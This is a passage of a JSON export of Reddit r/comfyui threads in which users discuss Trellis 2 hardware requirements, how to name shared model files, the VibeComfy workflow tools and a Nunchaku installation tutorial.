          "text": "This is ALWAYS what we need, no hype, trusted source, honest evaluations. Can't fix or progress if there isn't a truth of source, multiple for that matter, and you are a strong valid data point we should lean on for reference. Many thanks!",
          "score": 1,
          "created_utc": "2026-01-23 15:42:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1332ax",
          "author": "optimisticalish",
          "text": "Nice, but it's my understanding that Trellis 2 needs a $25k NVIDIA H100. If a studio has that kind of cash to spare, just to get videogame assets... \"not at a level where these assets can be dropped directly into production without additional work\", then they really should be hiring a proper asset maker.\n\nAre there any ComfyUI solutions for impressive 3D model generation with textures, which can be run on standard gaming graphics cards? I'm not talking about static single-mesh garden gnomes. The ideal for animators would be to prompt for multi-mesh and ready- rigged 3D figures that you can drop into something like the $29 Bondware Poser 12.",
          "score": 0,
          "created_utc": "2026-01-22 17:51:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1376ur",
              "author": "jib_reddit",
              "text": "Or you can rent one for $2-$3 an hour when you need it...",
              "score": 3,
              "created_utc": "2026-01-22 18:09:29",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o13b7x6",
                  "author": "optimisticalish",
                  "text": "Ah I see. I didn't realise that.",
                  "score": 1,
                  "created_utc": "2026-01-22 18:27:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o137rz6",
              "author": "ArsInvictus",
              "text": "There are examples of Trellis 2 running on a 5060 out there, though it sounds tight, but I'm guessing a 5090 will run it with room to spare.",
              "score": 3,
              "created_utc": "2026-01-22 18:12:04",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o13csj7",
              "author": "Sudden-Variation-660",
              "text": "This is not true at all, i‚Äôm running it on a 3090.",
              "score": 2,
              "created_utc": "2026-01-22 18:34:03",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o16wkjl",
                  "author": "turbosmooth",
                  "text": "agreed, running it on a 3080ti mobile (16gig VRAM), I would guess 12gig VRAM is bare minimum from my testing.",
                  "score": 1,
                  "created_utc": "2026-01-23 05:57:46",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o13p9aj",
              "author": "Smile_Clown",
              "text": ">Nice, but it's my understanding that Trellis 2 needs a $25k NVIDIA H100\n\nYour understanding is wrong.  I run it with a 4090 just fine and I know many people can run it with much, much less.\n\nHopefully you look into things a little more before you dismiss things.\n\nwhich makes your later analysis silly:\n\n>If a studio has that kind of cash to spare, just to get videogame assets...\n\nDon't do this... don't make assumptions based on something else, especially when you're not up to speed with the subject. projecting is just silly.\n\n>Are there any ComfyUI solutions for impressive 3D model generation with textures, which can be run on standard gaming graphics cards?\n\nYes... ffs... trellis 2 runs in comfyui there are several vids on YT explain the process easy peasy. There are also nodes for cleanup, patching and making it virtually perfect (from an amateur stance anyway)\n\n\nYour entire comment hinges on something you were absolutely wrong about. Crazy huh?\n\n>The ideal for animators would be to prompt for multi-mesh and ready- rigged 3D figures that you can drop into something like the $29 Bondware Poser 12.\n\nThat's the kicker. That's YOU and YOUR ideal, not \"ideal for animators\" as animators all have different processes.  and yes, you can do some of this with trellis and some basic understanding and learning about the process.\n\nYou're not an animator, you want to drop in rigged setups from a prompt. That's lazy and not creative. There is NOTHING wrong with it, I would love to see and enjoy your work, but when  you slap the \"I am an animator\" label on it, it's a bit icky. (but lol, I saw someone do with with trellis and mixamo)",
              "score": 1,
              "created_utc": "2026-01-22 19:29:33",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o13rfhu",
                  "author": "optimisticalish",
                  "text": "I was just quoting the official Microsoft page on the matter. It recommends a H100. Nothing else",
                  "score": 2,
                  "created_utc": "2026-01-22 19:39:32",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o144cvl",
                  "author": "Botoni",
                  "text": "Will it run on 8gb 3070 with offloading?",
                  "score": 1,
                  "created_utc": "2026-01-22 20:39:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qkzn9g",
      "title": "[Node Release] ComfyUI Node Organizer",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/cdtt6m19b5fg1",
      "author": "PBandDev",
      "created_utc": "2026-01-23 19:01:25",
      "score": 79,
      "num_comments": 2,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkzn9g/node_release_comfyui_node_organizer/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1ldgww",
          "author": "leftclot",
          "text": "Ugh. Finally.",
          "score": 2,
          "created_utc": "2026-01-25 09:54:53",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qni3us",
      "title": "[PSA] If you make workflows with the intention of sharing please use default names for the models, text encoders, vae, etc....",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qni3us/psa_if_you_make_workflows_with_the_intention_of/",
      "author": "MeatsOfRage2",
      "created_utc": "2026-01-26 14:52:08",
      "score": 72,
      "num_comments": 18,
      "upvote_ratio": 0.93,
      "text": "When it's personal use go to town with the renaming but there's nothing more frustrating that getting a workflow full of models that return no results on Google only to discover that someone just renamed ae.safetensors to something else.\n\nAt the very least explain this somewhere.",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qni3us/psa_if_you_make_workflows_with_the_intention_of/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o1ubef8",
          "author": "q5sys",
          "text": "I never understood why people renamed their models.  For LORA I can understand, because some people on Civitai dont seem to understand the concept of naming and upload things like, \\`76GC6BQDK8T5M61VS0K9VBR4V0.safetensors\\`.  \nBut for the main models, I just never understood why they bothered.",
          "score": 9,
          "created_utc": "2026-01-26 16:18:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1xc8o7",
              "author": "FourtyMichaelMichael",
              "text": "Why civit didn't enforce the first 8 of the hash on the start of all files.... I have no idea but it is a fucking failure.",
              "score": 3,
              "created_utc": "2026-01-27 00:27:43",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1y0fov",
                  "author": "q5sys",
                  "text": "Because Civitai was started by people that clearly had no experience in data management. There are so many simple things that could have been done better.  Like auto-naming uploads with the title the user gives, along with the lora version #, model, and date, and hash.  \nSo instead of \\`76GC6BQDK8T5M61VS0K9VBR4V0.safetensors\\` you would have \\`Impressionist\\_Art\\_Style\\_v1-Flux.1.dev-20250819-c930c3f.safetensors\\`",
                  "score": 3,
                  "created_utc": "2026-01-27 02:38:00",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1y9c68",
              "author": "afinalsin",
              "text": "Because when you download from Huggingface you often have to decide on a name otherwise you'll end up with a dozen different \"diffusion_pytorch_model.safetensors\". \n\nI go one step further with renaming LORAs and put the trigger words directly in the filename, because looking them up is a ballache. So I have tons of LORAs named like this: \n\n>Ill tool - dungeons and dragons character maker concept - pick race and class - extra tags lowlvl midlvl highlvl evil good neutral alignment fantasy medieval.safetensors\n\nCouldn't tell you where I actually got most of them, but they're easier for me to use which is the most important thing.",
              "score": 2,
              "created_utc": "2026-01-27 03:27:18",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ust2r",
          "author": "CheeseWithPizza",
          "text": "Add notes  \nProvide link to the models  \nTry to use comfy core nodes  \nAvoid using sub-graph for small group",
          "score": 9,
          "created_utc": "2026-01-26 17:32:59",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1tx10s",
          "author": "Woisek",
          "text": "\"ae\" is pretty useless as a description, that's why I renamed it to FLUX VAE. Idk what mindless dude came up with this, as other VAE have it at least in their filename.\n\nSame goes for certain LoRAs, with some BS naming in them, totally inconsistent.",
          "score": 22,
          "created_utc": "2026-01-26 15:15:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1xcjr9",
              "author": "FourtyMichaelMichael",
              "text": "what about \n\nsheBends_final_r0005060_safetensors.safetensors \n\nisn't clear!?",
              "score": 1,
              "created_utc": "2026-01-27 00:29:17",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1xjjtx",
                  "author": "Woisek",
                  "text": "\\_final\\_r0005060\\_\n\n‚¨Ü‚¨Ü‚¨Ü This. This isn't a production finished description. This has no value whatsoever in the filename.",
                  "score": 1,
                  "created_utc": "2026-01-27 01:05:40",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1uu142",
          "author": "discoltk",
          "text": "This is a tooling issue as much as a standardization failure.  If the tools would leverage checksums (sha256) to display/confirm files at least you could be sure the one you have is what you need. It would encourage people to include the checksums in their notes & workflow description, etc.)",
          "score": 5,
          "created_utc": "2026-01-26 17:38:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1udi5v",
          "author": "GeroldMeisinger",
          "text": "[https://github.com/kianxyzw/comfyui-model-linker](https://github.com/kianxyzw/comfyui-model-linker)",
          "score": 3,
          "created_utc": "2026-01-26 16:27:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1wg4z0",
          "author": "Consistent_Cod_6454",
          "text": "Yoh you can‚Äôt be a beggar and be giving conditions‚Ä¶ if you must receive free WFs then it is at the donors conditions‚Ä¶. Take it or leave it period. Y‚Äôall grumble too much.",
          "score": 5,
          "created_utc": "2026-01-26 21:50:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vqf61",
          "author": "mallibu",
          "text": "And you dont need 90% of the custom nodes you use, like a kid who just learned the linux terminal",
          "score": 1,
          "created_utc": "2026-01-26 19:56:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1vy1ob",
          "author": "No_Statement_7481",
          "text": "to be fair, what also infuriates me when people upload loras, and when you download them it looks like a dam bitcoin address LOL, hate that shit. I always try to check if I can pull lora info if I forget to rename them. Sometimes it helps. Sometimes it doesn't.",
          "score": 1,
          "created_utc": "2026-01-26 20:30:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1y2lgs",
          "author": "No-Zookeepergame4774",
          "text": "How about, if someone shares workflows for free, you thank them, or don‚Äôt use them, and reserve making demands for things you are paying for in some way.",
          "score": 1,
          "created_utc": "2026-01-27 02:49:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1yb7mx",
          "author": "afinalsin",
          "text": ">At the very least explain this somewhere.\n\nI feel like it should be pretty self explanatory. If you downloaded a flux workflow, you should probably know the diffusion model will most likely be a flux model, the models in the clip loader are going to be some variant of the T5 and Clip_L, and the VAE is going to be some variant of the flux VAE. \n\nIf you're trying to perfectly replicate an image for whatever reason you'll want the exact models, but if you're only using the workflow for the techniques you can and should supply your own models.\n\nThe models you download should be renamed in a way that makes sense anyway. Are you going to remember that \"ae.safetensors\" is the Flux.1 VAE when you've got dozens of different workflows spanning multiple different model architectures all running their own variant of a VAE? Maybe, but you can guarantee you remember by renaming it from \"ae.safetensors\" to \"flux1_vae.safetensors\", which is why people do it.",
          "score": 1,
          "created_utc": "2026-01-27 03:38:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ygrxz",
          "author": "ResponsibleTruck4717",
          "text": "Honestly I would prefer them start by removing all the custom nodes, and break big workflow into smaller ones.",
          "score": 1,
          "created_utc": "2026-01-27 04:11:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1z7d3p",
          "author": "Justify_87",
          "text": "The names of Loras in general are awful and oftentimes have nothing to do with its purpose",
          "score": 1,
          "created_utc": "2026-01-27 07:28:52",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ufbet",
          "author": "SearchTricky7875",
          "text": "use this tool instead, it will give you ready to download link for all the models in a workflow [https://www.genaicontent.org/ai-tools/comfyui-models-downloader](https://www.genaicontent.org/ai-tools/comfyui-models-downloader)",
          "score": -2,
          "created_utc": "2026-01-26 16:35:14",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qlnze6",
      "title": "Friends: Z-Image Turbo - Qwen Image Edit 2511 - Wan 2.2 - RTX 2060 Super 8GB VRAM",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/dhwduzmh1bfg1",
      "author": "MayaProphecy",
      "created_utc": "2026-01-24 14:11:36",
      "score": 70,
      "num_comments": 9,
      "upvote_ratio": 0.91,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qlnze6/friends_zimage_turbo_qwen_image_edit_2511_wan_22/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o1fewp4",
          "author": "MayaProphecy",
          "text": "A new short story... I hope you like it.\n\nWorkflows: [https://drive.google.com/file/d/1GC6mClujD5vggyIHi6cnT\\_vuE9fRmwGg/view?usp=sharing](https://drive.google.com/file/d/1GC6mClujD5vggyIHi6cnT_vuE9fRmwGg/view?usp=sharing)\n\nMy previous videos: [https://www.reddit.com/user/MayaProphecy/submitted/](https://www.reddit.com/user/MayaProphecy/submitted/)",
          "score": 6,
          "created_utc": "2026-01-24 14:11:56",
          "is_submitter": true,
          "replies": [
            {
              "id": "o1ihleh",
              "author": "alltherobots",
              "text": "Saving the link to check it out later. I‚Äôve been looking for a low VRAM way to do Qwen. Thanks!",
              "score": 1,
              "created_utc": "2026-01-24 22:47:11",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1fngsm",
          "author": "thixono920",
          "text": "How long was render?",
          "score": 2,
          "created_utc": "2026-01-24 14:58:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1fo1ad",
              "author": "MayaProphecy",
              "text": "\\~300 seconds each segment at 832x480... 4 segments in total.",
              "score": 4,
              "created_utc": "2026-01-24 15:01:58",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g6u0g",
          "author": "Swimming_Dragonfly72",
          "text": "nice result. What upscaler did you use?",
          "score": 1,
          "created_utc": "2026-01-24 16:31:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1g89i2",
              "author": "MayaProphecy",
              "text": "Topaz",
              "score": 4,
              "created_utc": "2026-01-24 16:37:37",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1h6q2i",
          "author": "SAURABH_STAR",
          "text": "I have 3060 12gb can I do this?",
          "score": 1,
          "created_utc": "2026-01-24 19:07:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h8ofo",
              "author": "MayaProphecy",
              "text": "Sure, why not? I made it with less...",
              "score": 1,
              "created_utc": "2026-01-24 19:16:03",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1n5izq",
          "author": "goldfish9x",
          "text": "Looks good!",
          "score": 1,
          "created_utc": "2026-01-25 16:32:26",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qkb7i1",
      "title": "VibeComfy - CLI tools for Claude Code to understand and edit Comfy workflows",
      "subreddit": "comfyui",
      "url": "https://github.com/peteromallet/VibeComfy",
      "author": "PetersOdyssey",
      "created_utc": "2026-01-23 00:03:51",
      "score": 68,
      "num_comments": 8,
      "upvote_ratio": 0.93,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkb7i1/vibecomfy_cli_tools_for_claude_code_to_understand/",
      "domain": "github.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1cij3y",
          "author": "cedarconnor",
          "text": "So cool.",
          "score": 2,
          "created_utc": "2026-01-24 01:18:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o19dlt9",
          "author": "Playful_Side_6662",
          "text": "i‚Äôm happy to see this. i‚Äôm even happier to see it‚Äôs from you üôèüèº",
          "score": 1,
          "created_utc": "2026-01-23 16:12:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1a9x5i",
              "author": "PetersOdyssey",
              "text": "ü´¢üëãü¶ç",
              "score": 1,
              "created_utc": "2026-01-23 18:38:38",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1bns7y",
          "author": "superstarbootlegs",
          "text": "this is gold. I was thinking about ways to use openrouter for this and for analysing what nodes do in comfyui, so nice timing.",
          "score": 1,
          "created_utc": "2026-01-23 22:32:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1dxn7i",
          "author": "Sensitive_Ganache571",
          "text": "Wow - free access to Claude code?)))\n\nNo",
          "score": 1,
          "created_utc": "2026-01-24 06:57:21",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hupe5",
              "author": "PetersOdyssey",
              "text": "We have local alternatives that this will work fine with! Part of why I didn‚Äôt make it in Claude‚Äôs format",
              "score": 1,
              "created_utc": "2026-01-24 20:57:37",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1huqwp",
                  "author": "PetersOdyssey",
                  "text": "Unsure if local LLMs are good enough yet though",
                  "score": 1,
                  "created_utc": "2026-01-24 20:57:49",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qj1zyt",
      "title": "ComfyUI Nunchaku Tutorial: Install, Models, and Workflows Explained (Ep02)",
      "subreddit": "comfyui",
      "url": "https://www.youtube.com/watch?v=LDqD9Fp8J6g",
      "author": "pixaromadesign",
      "created_utc": "2026-01-21 16:08:16",
      "score": 68,
      "num_comments": 15,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Tutorial",
      "permalink": "https://reddit.com/r/comfyui/comments/1qj1zyt/comfyui_nunchaku_tutorial_install_models_and/",
      "domain": "youtube.com",
      "is_self": false,
      "comments": [
        {
          "id": "o0vnc91",
          "author": "PuzzleheadedCap8718",
          "text": "Your tutorials are literally what got me started using ComfyUI. Thank you for what you do!",
          "score": 7,
          "created_utc": "2026-01-21 16:24:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0vrf7t",
              "author": "pixaromadesign",
              "text": "Glad I could help ‚ò∫Ô∏è",
              "score": 4,
              "created_utc": "2026-01-21 16:42:46",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0z0eoj",
          "author": "Own-Quote-2365",
          "text": "My logs show that the¬†**comfy-kitchen backend is already available with nvfp4 capabilities.**¬†This led me to believe that Nunchaku is now a built-in feature.¬†**Is it still necessary to follow the tutorial steps for separate node Nunchaku system installation, or am I just overcomplicating things?**",
          "score": 4,
          "created_utc": "2026-01-22 02:07:10",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0zopct",
              "author": "pixaromadesign",
              "text": "I don't know all the technical stuff, i didn't install separately I just used the Nunchaku bat file to install the nodes and wheel easier",
              "score": 1,
              "created_utc": "2026-01-22 04:31:34",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0w1z5n",
          "author": "Skyline34rGt",
          "text": "In topic of Nunchaku. Someone make unofficialy Qwen Image 2512 for Nunchaku - [https://huggingface.co/QuantFunc/Nunchaku-Qwen-Image-2512/tree/main](https://huggingface.co/QuantFunc/Nunchaku-Qwen-Image-2512/tree/main)\n\nQwen Edit 2511 also on the way.",
          "score": 3,
          "created_utc": "2026-01-21 17:30:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0yc6a8",
              "author": "2legsRises",
              "text": "int4 vs fp4?\n\nedit - fp4 for nvidia 5x series.\nint4 for 4 series and lower i think",
              "score": 1,
              "created_utc": "2026-01-21 23:52:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o105h3n",
                  "author": "Skyline34rGt",
                  "text": "correct",
                  "score": 3,
                  "created_utc": "2026-01-22 06:35:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0wfk5z",
          "author": "Zelsire",
          "text": "you are og of comfy community bro",
          "score": 2,
          "created_utc": "2026-01-21 18:29:48",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0wylcb",
          "author": "bingobongo3001",
          "text": "Thank you for your work!",
          "score": 2,
          "created_utc": "2026-01-21 19:54:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o165gpm",
          "author": "lndecay",
          "text": "Bro you are the goat, I installed nunchaku using the easy installer and worked great the first time I used it, but after a few gens I started getting noise outputs and I don‚Äôt know why, literally the same workflow (same settings and everything the same)",
          "score": 1,
          "created_utc": "2026-01-23 03:03:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16bcvc",
              "author": "pixaromadesign",
              "text": "not sure maybe you cancel some of the generation? try to use those penguin icons on top to clean up the models and memory and try again not sure what else could be",
              "score": 1,
              "created_utc": "2026-01-23 03:37:27",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16buk6",
                  "author": "lndecay",
                  "text": "https://preview.redd.it/oah8vj67s0fg1.jpeg?width=1600&format=pjpg&auto=webp&s=e95f2c03c2965fa201dfd64f78235c86746a5639\n\nLook, this is what happens, I literally restarted my pc and can‚Äôt get it to work again, it is really strange",
                  "score": 1,
                  "created_utc": "2026-01-23 03:40:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    }
  ]
}